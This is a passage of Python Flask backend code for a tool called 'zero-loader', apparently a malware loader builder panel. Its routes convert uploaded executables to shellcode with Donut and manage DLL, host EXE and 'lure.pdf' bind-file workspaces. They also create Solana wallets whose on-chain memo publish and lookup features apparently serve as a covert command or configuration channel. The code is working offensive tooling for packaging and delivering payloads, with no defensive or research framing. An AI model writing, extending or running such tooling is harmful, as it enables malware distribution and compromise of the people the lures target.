def api_profiles_delete(pid):
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    profiles = [p for p in _load_profiles() if p["id"] != pid]
    _save_profiles(profiles)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# Donut  (EXE → shellcode)  —  workspace/donut/<id>/
# ---------------------------------------------------------------------------

@app.route("/api/donut/jobs")
def api_donut_jobs():
    return jsonify(_load_donut_jobs())


@app.route("/api/donut", methods=["POST"])
def api_donut():
    if "exe" not in request.files:
        return jsonify({"ok": False, "stderr": "exe file missing"}), 400
    if not DONUT_EXE.is_file():
        return jsonify({"ok": False, "stderr": "donut\\donut.exe not found"}), 500

    arch = (request.form.get("arch") or "2").strip()
    if arch not in ("1", "2", "3"):
        arch = "2"
    arch_label = {"1": "x86", "2": "x64", "3": "x86+x64"}[arch]

    job_id  = _new_id()
    job_dir = DONUT_DIR / job_id
    job_dir.mkdir(parents=True, exist_ok=True)

    upload   = request.files["exe"]
    name     = _safe_name(upload.filename or "payload.exe") or "payload.exe"
    label    = (request.form.get("label") or "").strip()[:64]
    exe_path = job_dir / name
    upload.save(str(exe_path))
    out_path = job_dir / "shellcode.bin"

    result = _run([str(DONUT_EXE), "-a", arch, "-i", str(exe_path), "-o", str(out_path)])
    meta = {
        "id":            job_id,
        "original_name": name,
        "label":         label,
        "arch":          arch,
        "arch_label":    arch_label,
        "created_at":    int(time.time()),
        "ok":            result["ok"],
        "size_in":       exe_path.stat().st_size if exe_path.is_file() else 0,
        "size_out":      out_path.stat().st_size if (result["ok"] and out_path.is_file()) else 0,
    }
    (job_dir / "meta.json").write_text(json.dumps(meta, indent=2))
    result["job"] = meta
    return jsonify(result)


@app.route("/api/donut/jobs/<jid>/download/<ftype>")
def api_donut_download(jid, ftype):
    if not _ID_RE.match(jid):
        return "invalid", 400
    job_dir = DONUT_DIR / jid
    if not job_dir.is_dir():
        return "not found", 404
    if ftype == "shellcode":
        path, dl = job_dir / "shellcode.bin", f"shellcode_{jid}.bin"
    elif ftype == "original":
        mf = job_dir / "meta.json"
        if not mf.is_file():
            return "not found", 404
        fname = json.loads(mf.read_text()).get("original_name", "payload.exe")
        path, dl = job_dir / fname, fname
    else:
        return "invalid", 400
    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=dl)


@app.route("/api/donut/jobs/<jid>", methods=["PATCH"])
def api_donut_patch(jid):
    if not _ID_RE.match(jid):
        return jsonify({"ok": False}), 400
    data  = request.get_json(force=True, silent=True) or {}
    label = (data.get("label") or "").strip()[:64]
    mf    = DONUT_DIR / jid / "meta.json"
    if not mf.is_file():
        return jsonify({"ok": False, "stderr": "job not found"}), 404
    meta          = json.loads(mf.read_text())
    meta["label"] = label
    mf.write_text(json.dumps(meta, indent=2))
    return jsonify({"ok": True, "meta": meta})


@app.route("/api/donut/jobs/<jid>", methods=["DELETE"])
def api_donut_delete(jid):
    if not _ID_RE.match(jid):
        return jsonify({"ok": False}), 400
    jdir = DONUT_DIR / jid
    if jdir.is_dir():
        shutil.rmtree(str(jdir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# DLL workspace  —  workspace/dlls/<id>/
# ---------------------------------------------------------------------------

@app.route("/api/dlls")
def api_dlls_list():
    return jsonify(_load_dlls())


@app.route("/api/dlls", methods=["POST"])
def api_dlls_upload():
    if "dll" not in request.files:
        return jsonify({"ok": False, "stderr": "dll file missing"}), 400
    meta = _upload_asset(DLLS_DIR, request.files["dll"], "target.dll")
    return jsonify({"ok": True, "dll": meta})


@app.route("/api/dlls/<did>", methods=["DELETE"])
def api_dlls_delete(did):
    if not _ID_RE.match(did):
        return jsonify({"ok": False}), 400
    ddir = DLLS_DIR / did
    if ddir.is_dir():
        shutil.rmtree(str(ddir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# EXE workspace  —  workspace/exes/<id>/
# ---------------------------------------------------------------------------

@app.route("/api/exes")
def api_exes_list():
    return jsonify(_load_exes())


@app.route("/api/exes", methods=["POST"])
def api_exes_upload():
    if "exe" not in request.files:
        return jsonify({"ok": False, "stderr": "exe file missing"}), 400
    meta = _upload_asset(EXES_DIR, request.files["exe"], "host.exe")
    return jsonify({"ok": True, "exe": meta})


@app.route("/api/exes/<eid>", methods=["DELETE"])
def api_exes_delete(eid):
    if not _ID_RE.match(eid):
        return jsonify({"ok": False}), 400
    edir = EXES_DIR / eid
    if edir.is_dir():
        shutil.rmtree(str(edir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# Bind files workspace  —  workspace/binds/<id>/
# ---------------------------------------------------------------------------

@app.route("/api/binds")
def api_binds_list():
    return jsonify(_load_binds())


@app.route("/api/binds", methods=["POST"])
def api_binds_upload():
    if "bind" not in request.files:
        return jsonify({"ok": False, "stderr": "bind file missing"}), 400
    meta = _upload_asset(BINDS_DIR, request.files["bind"], "lure.pdf")
    return jsonify({"ok": True, "bind": meta})


@app.route("/api/binds/<bid>", methods=["DELETE"])
def api_binds_delete(bid):
    if not _ID_RE.match(bid):
        return jsonify({"ok": False}), 400
    bdir = BINDS_DIR / bid
    if bdir.is_dir():
        shutil.rmtree(str(bdir), ignore_errors=True)
    return jsonify({"ok": True})


@app.route("/api/binds/<bid>/download")
def api_binds_download(bid):
    if not _ID_RE.match(bid):
        return "invalid", 400
    meta = _find_asset(BINDS_DIR, bid)
    if not meta:
        return "not found", 404
    safe = _safe_name(meta["name"])
    if not safe:
        return "invalid", 400
    path = BINDS_DIR / bid / safe
    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=safe)


# ---------------------------------------------------------------------------
# Wallets  —  workspace/solana/<id>/
# ---------------------------------------------------------------------------

@app.route("/api/wallets")
def api_wallets_list():
    return jsonify(_load_wallets())


@app.route("/api/wallets", methods=["POST"])
def api_wallets_create():
    data = request.get_json(force=True, silent=True) or {}
    name = (data.get("name") or "Wallet").strip()

    # Auto-increment name if it already exists
    existing_names = {w["name"] for w in _load_wallets()}
    if name in existing_names:
        i = 2
        while f"{name} {i}" in existing_names:
            i += 1
        name = f"{name} {i}"

    result = _run([sys.executable, str(SOLANA_DIR / "create_wallet.py"), "--json"])
    if not result["ok"]:
        return jsonify({"ok": False, "stderr": result.get("stderr", "Script failed")})
    try:
        wdata = json.loads(result["stdout"].strip())
    except Exception:
        return jsonify({"ok": False, "stderr": "Failed to parse wallet output"})

    wid  = _new_id()
    meta = {"id": wid, "name": name, "address": wdata["public_key"],
            "created_at": int(time.time())}
    wdir = WALLETS_DIR / wid
    wdir.mkdir(parents=True, exist_ok=True)
    (wdir / "keypair.json").write_text(json.dumps(wdata["keypair_bytes"]), encoding="utf-8")
    (wdir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")

    return jsonify({"ok": True, "wallet": meta})
    # keypair_bytes intentionally NOT returned — download via /api/wallets/<id>/keypair


@app.route("/api/wallets/<wid>", methods=["PUT"])
def api_wallets_rename(wid):
    if not _ID_RE.match(wid):
        return jsonify({"ok": False}), 400
    data = request.get_json(force=True, silent=True) or {}
    name = (data.get("name") or "").strip()
    if not name:
        return jsonify({"ok": False, "stderr": "name required"}), 400
    meta = _find_wallet(wid)
    if not meta:
        return jsonify({"ok": False}), 404
    meta["name"] = name
    _save_wallet_meta(meta)
    return jsonify({"ok": True, "wallet": meta})


@app.route("/api/wallets/<wid>", methods=["DELETE"])
def api_wallets_delete(wid):
    if not _ID_RE.match(wid):
        return jsonify({"ok": False}), 400
    wdir = WALLETS_DIR / wid
    if wdir.is_dir():
        shutil.rmtree(str(wdir), ignore_errors=True)
    return jsonify({"ok": True})


@app.route("/api/wallets/<wid>/keypair")
def api_wallets_keypair(wid):
    if not _ID_RE.match(wid):
        return "invalid", 400
    kp = WALLETS_DIR / wid / "keypair.json"
    if not kp.is_file():
        return "not found", 404
    return send_file(str(kp), as_attachment=True, download_name="keypair.json")


@app.route("/api/wallets/<wid>/lookup", methods=["POST"])
def api_wallets_lookup(wid):
    if not _ID_RE.match(wid):
        return jsonify({"ok": False}), 400
    wallet = _find_wallet(wid)
    if not wallet:
        return jsonify({"ok": False, "stderr": "wallet not found"}), 404

    data    = request.get_json(force=True, silent=True) or {}
    rpc_url = (data.get("rpc_url") or "").strip()

    # Always scan the 10 most-recent transactions and verify fee payer.
    # lookup_memo.py reads the "memo" field from getSignaturesForAddress
    # (no extra getTransaction per entry) then calls getTransaction once
    # on the first matching entry to confirm accountKeys[0] == our wallet.
    argv = [sys.executable, str(SOLANA_DIR / "lookup_memo.py"),
            wallet["address"], "--json", "--limit", "10"]
    if rpc_url.startswith(("http://", "https://")):
        argv += ["--rpc", rpc_url]

    result = _run(argv)
    if result["ok"]:
        try:
            parsed = json.loads(result["stdout"].strip())
            result.update(parsed)
            result["stdout"] = ""
        except Exception:
            pass
    return jsonify(result)


@app.route("/api/wallets/<wid>/publish", methods=["POST"])
def api_wallets_publish(wid):
    if not _ID_RE.match(wid):
        return jsonify({"ok": False}), 400
    wallet = _find_wallet(wid)
    if not wallet:
        return jsonify({"ok": False, "stderr": "wallet not found"}), 404

    kp_path = WALLETS_DIR / wid / "keypair.json"
    if not kp_path.is_file():
        return jsonify({"ok": False, "stderr": "keypair not on server — re-create wallet"}), 404

    data      = request.get_json(force=True, silent=True) or {}
    memo_text = (data.get("memo") or "").strip()
    rpc_url   = (data.get("rpc_url") or "").strip()
    if not memo_text:
        return jsonify({"ok": False, "stderr": "memo text required"}), 400

    argv = [sys.executable, str(SOLANA_DIR / "publish_memo.py"),
            "--keypair", str(kp_path), "--memo", memo_text, "--json"]
    if rpc_url.startswith(("http://", "https://")):
        argv += ["--rpc", rpc_url]

    result = _run(argv)
    if result["stdout"]:
        try:
            parsed = json.loads(result["stdout"].strip())
            result.update(parsed)
            result["stdout"] = ""
        except Exception:
            pass
    return jsonify(result)


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    port = int(os.environ.get("ZLOADER_PORT", "7890"))
    print(f"[zero-loader web] http://127.0.0.1:{port}")
    print(f"[zero-loader web] project root: {PROJECT_ROOT}")
    print("[zero-loader web] localhost-only; DO NOT expose to a network")
    app.run(host="127.0.0.1", port=port, debug=False, threaded=True)
